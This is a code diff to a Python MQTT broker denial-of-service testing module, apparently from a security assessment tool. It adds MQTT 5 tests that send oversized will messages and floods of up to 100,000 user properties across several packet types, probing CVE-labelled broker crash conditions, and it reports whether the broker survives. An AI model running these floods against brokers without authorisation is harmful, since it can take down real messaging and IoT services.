@@ -2,8 +2,22 @@ import ssl, time
 import paho.mqtt.client as mqtt
 from paho.mqtt.packettypes import PacketTypes
 from paho.mqtt.properties import Properties
+from paho.mqtt.reasoncodes import ReasonCodes
 from statistics import mean
+from datetime import datetime
+from math import isclose
 import argparse
+import math
+
+# Allow this module to be executed individually
+import sys, os
+_, current_module = os.path.split(__file__)
+_, exec_module    = os.path.split(sys.argv[0])
+if (exec_module == current_module):
+    from mqtt5_client import *
+else:
+    from .mqtt5_client import *
+
 
 # To stay consitent with Sniffing attack
 class Credentials:
@@ -33,6 +47,7 @@ publish_times = []
 
 max_queue = 0
 max_payload = 0
+max_user_properties = 0
 
 # MQTT5 - enforces the persistent session
 def gen_connect_properties():
@@ -285,7 +300,7 @@ def slow_dos(host, version, port, credentials, cert_key_paths, max_connections, 
         for x in range (wait_time):
             if(max_connections-connected == 0):
                 print("All "+str(max_connections)+" connections succeeded")
-                break;
+                break
             else:
                 if (x % 60 == 0):
                     print(str((wait_time-x)//60) + " minutes remaining")
@@ -451,6 +466,168 @@ def get_max_payload(host, version, port, credentials, cert_key_paths, max_payloa
     return max_payload
 
 
+def maximum_packet_size_test(host, port, will_topic, maximum_message_size, heavy_header_flag, credentials, cert_key_paths):
+    print("-----Maximum Packet Size Test-----")
+    result = None
+    
+    #Publisher connects attaching will message; it is possible to publish an heavy header 
+    client_publisher = init_mqtt5_client(host, port, 60, "will_test", cID="client_pub",
+                                    will_topic=will_topic, will_payload=str("0"*(maximum_message_size)).encode('ascii'),
+                                    will_properties=gen_properties(PacketTypes.WILLMESSAGE, {"CorrelationData":b"C"*(maximum_message_size)}) if heavy_header_flag else None,
+                                    credentials=credentials, cert_key_paths=cert_key_paths)
+    
+    if(wait_for_event(client_publisher, Mqtt5Client.CONNECTION)):
+        #Subscriber connects and subscribes to will topic
+        client_subscriber = init_mqtt5_client(host, port, 60, "will_test", cID="client_sub", 
+                                        conn_properties=gen_properties(PacketTypes.CONNECT, {"MaximumPacketSize":maximum_message_size}),
+                                        credentials=credentials, cert_key_paths=cert_key_paths)
+        
+        if(wait_for_event(client_subscriber, Mqtt5Client.CONNECTION)):
+            client_subscriber.subscribe(will_topic, 2)
+            
+            if(wait_for_event(client_subscriber, Mqtt5Client.SUBSCRIBE)):
+                #Publisher disconnects with will message
+                print("Disconnecting client_publisher...")
+                disconnect_client(client_publisher, reason_code=ReasonCodes(PacketTypes.DISCONNECT, "Disconnect with will message", 4))
+                
+                #Subscriber waits for a message on will_topic
+                print("Client_subscriber is waiting for messages...")
+                result = wait_for_event(client_subscriber, Mqtt5Client.MESSAGE)
+            disconnect_client(client_subscriber)
+    
+    if(result):
+        print("Test not passed: message received")
+    elif(not result):
+        print("Test passed: message not received")
+    print("----------------------------------")
+
+    return result
+
+
+
+def setUserProperties(nProperties):
+    user_properties = []
+    #Generate properties (key=i:value=0)
+    for i in range(nProperties):
+        user_properties.append((str(i), str("0").encode('ascii')))
+    return user_properties
+
+def user_properties_test(host, port, max_user_properties_to_test, credentials, cert_key_paths):
+    print("-----User Properties Test (CVE-2021-41039)-----")
+    
+    global max_user_properties
+    acks = None
+    result = None
+    
+    counter = int(math.log(max_user_properties_to_test, 10))
+    n_user_properties = 0
+    for i in range(1, counter + 1):
+        #User properties number (from 10 and power of 10 by power of 10 until max_user_properties_to_test)
+        n_user_properties = int(math.pow(10, i))
+        user_properties = setUserProperties(n_user_properties)
+        
+        print(f"Test with {n_user_properties} properties... ", end = "")
+        client = init_mqtt5_client(host, port, 60, "user_properties_test", "userPropertiesClient", 
+                                   conn_properties=gen_properties(PacketTypes.CONNECT, {"UserProperty":user_properties}),
+                                   credentials=credentials, cert_key_paths=cert_key_paths)
+        acks = wait_for_event(client, Mqtt5Client.CONNECTION, 60)
+        
+        packet_types = [ PacketTypes.PUBLISH, PacketTypes.SUBSCRIBE, PacketTypes.UNSUBSCRIBE, PacketTypes.DISCONNECT ]
+        events = [ Mqtt5Client.PUBLISH, Mqtt5Client.SUBSCRIBE, Mqtt5Client.UNSUBSCRIBE, Mqtt5Client.DISCONNECTION ]
+        for idx in range(len(packet_types)):
+            #Send the next packet only if the previous one is acknowledged
+            if (not acks): print("Not Acknowledged"); break
+            
+            if idx == 0:
+                payload = str("C"*n_user_properties).encode('ascii')
+                client.publish("topic", payload, qos=2, retain=False, properties=gen_properties(packet_types[idx], {"UserProperty":user_properties}))
+            elif idx == 1:
+                client.subscribe("mytopic", qos=0, properties=gen_properties(packet_types[idx], {"UserProperty":user_properties}))
+            elif idx == 2:
+                client.unsubscribe("mytopic", properties=gen_properties(packet_types[idx], {"UserProperty":user_properties}))
+            elif idx == 3:
+                disconnect_client(client, properties=gen_properties(packet_types[idx], {"UserProperty":user_properties}))
+            
+            acks = wait_for_event(client, events[idx])
+            if idx == len(events) - 1: print("Acknowledged" if acks else "Not Acknowledged")
+
+    # Print results
+    if acks:
+        print("Test passed: broker acknowledged all the packets")
+        max_user_properties = n_user_properties
+        disconnect_client(client)
+        result = True
+    else:
+        client = init_mqtt5_client(host, port, 60, "user_properties_test", "userPropertiesClient", 
+                                   conn_properties=gen_properties(PacketTypes.CONNECT, {}),
+                                   credentials=credentials, cert_key_paths=cert_key_paths)
+        broker_alive = wait_for_event(client, Mqtt5Client.CONNECTION, 60)
+        max_user_properties = int(n_user_properties / 10)
+        
+        if broker_alive:
+            print("Test passed: broker did not acknowledge all the packets, but it is still alive")
+            disconnect_client(client)
+            result = True
+        else:
+            print("Test not passed: broker crashed")
+            result = False
+    print("-----------------------------")
+
+    client.loop_stop()
+
+    return result
+
+
+
+def will_delay_interval_test(host, port, will_topic, will_delay, session_expiry, credentials, cert_key_paths, tol=2):
+    print("-----Will Delay Interval Test (CVE-2019-1177)-----")
+    will_arrived = False
+    
+    #Publisher connects attaching will message
+    client_pub = init_mqtt5_client(host, port, 5, "session_will_test", "client_pub", 
+                             conn_properties=gen_properties(PacketTypes.CONNECT, {"SessionExpiryInterval":session_expiry}),
+                             will_topic=will_topic, will_payload=b"I'm dead", 
+                             will_properties=gen_properties(PacketTypes.WILLMESSAGE, {"WillDelayInterval":will_delay}),
+                             credentials=credentials, cert_key_paths=cert_key_paths)
+    
+    if(wait_for_event(client_pub, Mqtt5Client.CONNECTION)):
+        client_subscriber = init_mqtt5_client(host, port, 60, "session_will_test", cID="client_sub",
+                                              credentials=credentials, cert_key_paths=cert_key_paths)
+        
+        if(wait_for_event(client_subscriber, Mqtt5Client.CONNECTION)):
+            client_subscriber.subscribe(will_topic, 2)
+            
+            if(wait_for_event(client_subscriber, Mqtt5Client.SUBSCRIBE)):
+                #Disconnect publisher
+                print("Disconnecting client_publisher...")
+                client_pub.loop_stop(); client_pub.__del__()
+                start = datetime.now()
+                
+                #Subscriber waits for a message on will_topic
+                print("Client_subscriber is waiting for will message...")
+                wait_for_event(client_subscriber, Mqtt5Client.MESSAGE, will_delay+tol)
+                time = (datetime.now()-start).seconds
+                
+                #Check if will arrived after the lower time between session_expiry and will_delay 
+                will_arrived = isclose(time, min(session_expiry, will_delay), abs_tol=tol)
+            disconnect_client(client_subscriber)
+    
+    if(not will_arrived):
+        print("Test not passed: will message not arrived at session expirying")
+        try:
+            print("Trying to connect to the broker...")
+            client_test = init_mqtt5_client(host, port, 60, "session_will_test", cID="client_test", credentials=credentials, cert_key_paths=cert_key_paths)
+            not wait_for_event(client_test, Mqtt5Client.CONNECTION)
+            print("Connection successfull")
+        except ConnectionRefusedError:
+            print("Broker not available: it may be crashed")
+    else: 
+        print("Test passed: will message arrived at session expirying")
+
+    print("----------------------------------")
+    return will_arrived
+
+
 def broker_dos(host, version, port, credentials, connections, payload_size, slow_connections, max_queue_to_test, max_payload_to_test, topic, cert_key_paths):
     global max_queue
     global max_payload
@@ -481,6 +658,20 @@ def broker_dos(host, version, port, credentials, connections, payload_size, slow
         
     return (res1 or res2 or res3)
 
+def broker_dos_5(host, port, max_user_properties_to_test, credentials, cert_key_paths):
+    res1 = None; res2 = None; res3 = None
+    
+    will_topic = "will/topic"; max_pack_size = 2048; publish_heavy_header = False
+    res1 = maximum_packet_size_test(host, port, will_topic, max_pack_size, publish_heavy_header, credentials, cert_key_paths)
+    
+    if (max_user_properties_to_test != None):
+        res2 = user_properties_test(host, port, max_user_properties_to_test, credentials, cert_key_paths)
+    
+    will_delay = 20; session_expiry = 5
+    res3 = will_delay_interval_test(host, port, will_topic, will_delay, session_expiry, credentials, cert_key_paths)
+    
+    return [res1, res2, res3]
+
 # used for testing purposes
 if __name__ == "__main__":
 
@@ -508,6 +699,8 @@ if __name__ == "__main__":
     parser.add_argument('-cert', dest = 'client_cert_path', type=str, default=None, help='Client certificate path')
     parser.add_argument('-key', dest = 'client_key_path', type=str, default=None, help='Client key path')   
 
+    parser.add_argument('-mup', dest = 'max_user_properties', type=int, default=100000, help='Specify the max number of user properties to include in a message for User Properties Test (defaults to 100000 - multiples of 10)')
+
     args = parser.parse_args()
 
     credentials = Credentials()
@@ -530,19 +723,29 @@ if __name__ == "__main__":
     if args.max_payload == None or args.max_payload < 1:
         print('[!] "max_payload" parameter < 0 or null, no payload size test')
         args.max_payload = None
+    if args.max_user_properties == None or args.max_user_properties < 1:
+        print('[!] "max_user_properties" parameter < 0 or null, no user properties test')
+        args.max_user_properties = None
     
     print("DoS test completed. Result: " + str(
         broker_dos(args.broker_address, args.version, args.port, 
-        credentials, 
-        args.dos_fooding_conn, args.dos_size, args.dos_slow_conn,
-        args.max_queue,
-        args.max_payload,
-        args.topic,         
-        [args.ca_cert_path, args.client_cert_path, args.client_key_path])
+                   credentials, 
+                   args.dos_fooding_conn, args.dos_size, args.dos_slow_conn,
+                   args.max_queue,
+                   args.max_payload,
+                   args.topic,         
+                   [args.ca_cert_path, args.client_cert_path, args.client_key_path])
         ))
+    
+    if(args.version == '5'):
+        broker_dos_5(args.broker_address, args.port, 
+                     args.max_user_properties, 
+                     credentials, 
+                     [args.ca_cert_path, args.client_cert_path, args.client_key_path])
         
-    if(args.dos_slow_conn or args.max_queue or args.max_payload):
+    if(args.dos_slow_conn or args.max_queue or args.max_payload or args.max_user_properties):
         print("DoS info:")
         print("Max supported payload: " + (str(max_payload) if (args.max_payload) else "Skipped"))
         print("Messages queues:       " + (str(max_queue) if (args.max_queue) else "Skipped"))  
         print("Max connected clients: " + (str(connected) if (args.dos_slow_conn) else "Skipped"))
+        print("Max user properties:   " + (str(max_user_properties) if (args.max_user_properties) else "Skipped"))
